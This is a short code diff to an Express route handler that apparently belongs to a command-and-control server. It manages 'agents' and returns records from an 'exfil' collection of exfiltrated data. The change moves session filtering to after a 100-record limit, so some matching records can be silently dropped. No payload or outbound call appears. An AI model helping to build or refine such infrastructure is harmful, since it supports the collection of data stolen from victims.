@@ -236,15 +236,13 @@ router.delete('/agents/:id', async (req, res) => {
 router.get('/exfil_data', async (req, res) => {
     try {
         const sessionId = req.query.session_id;
-        let query = db.collection('exfil').orderBy('timestamp', 'desc').limit(100);
-        if (sessionId) {
-            query = db.collection('exfil').where('sessionId', '==', sessionId).orderBy('timestamp', 'desc').limit(100);
-        }
-
-        const snapshot = await query.get();
+        const snapshot = await db.collection('exfil').orderBy('timestamp', 'desc').limit(100).get();
         const items = [];
         snapshot.forEach(doc => {
-            items.push({ id: doc.id, ...doc.data() });
+            const d = doc.data();
+            if (!sessionId || d.sessionId === sessionId) {
+                items.push({ id: doc.id, ...d });
+            }
         });
         res.json({ success: true, data: items });
     } catch (err) {
